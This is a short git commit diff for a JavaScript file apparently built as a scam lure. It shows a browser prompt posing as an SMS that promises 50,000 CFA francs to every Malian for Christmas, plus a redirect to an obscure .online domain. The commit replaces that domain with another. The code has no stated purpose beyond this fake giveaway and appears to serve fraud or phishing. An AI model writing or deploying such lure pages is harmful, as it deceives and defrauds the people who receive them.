8ecffe41f3c9d4334dd19ff761e9295c2f61d398
newetijazz11 <newetijazz11@gmail.com>
2025-12-20 09:36:52 +0100

    Update and rename malixmas to malixmas.js

--- malixmas.js
+++ malixmas.js
@@ -1,5 +1,5 @@
 var password = 'Retirer Noel 50,000CFA'
 password=prompt('SMS: Pour fêter Noël cette année, nous offrons 50 000 francs CFA à tous les Maliens. Cliquez sur OK pour profiter de l’offre.','Retirer Noel 50,000CFA');
 if (password != 'Retirer Noel 50,000CFA') {
-location.href='https://www.favmrzi.online/Retirer-Noel-50000CFA';
+location.href='https://www.bhufrizx.online/Retirer-Noel-50000CFA';
 }
